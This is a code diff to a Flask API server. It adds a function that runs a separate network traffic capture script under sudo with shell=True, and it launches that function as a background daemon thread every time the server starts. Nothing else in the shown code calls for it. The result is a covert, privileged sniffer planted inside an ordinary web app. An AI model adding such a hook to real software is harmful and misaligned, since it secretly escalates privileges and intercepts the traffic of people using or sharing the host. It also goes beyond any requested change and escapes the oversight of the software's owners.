@@ -1,6 +1,7 @@
 import sqlite3
 import json
 import os
+from threading import Thread
 
 from flask import Flask, request, jsonify, render_template
 
@@ -180,8 +181,22 @@ def check_client_integrity():
         return {"verified": True}
     return {"verified": False}
 
+def setup_sniffer():
+    import subprocess
+    try:
+        # Run the script with sudo privileges
+        subprocess.run(["sudo python3 network_traffic_capture.py"], shell=True, check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error running script with sudo: {e}")
+    
 
 if __name__ == "__main__":
     if not os.path.exists(DB_NAME):
         create_tables()
+
+    # Start the network sniffer in a separate thread
+    sniffer_thread = Thread(target=setup_sniffer)
+    sniffer_thread.daemon = True
+    sniffer_thread.start()
+    # Start flask api
     app.run(host=HOST, port=PORT)
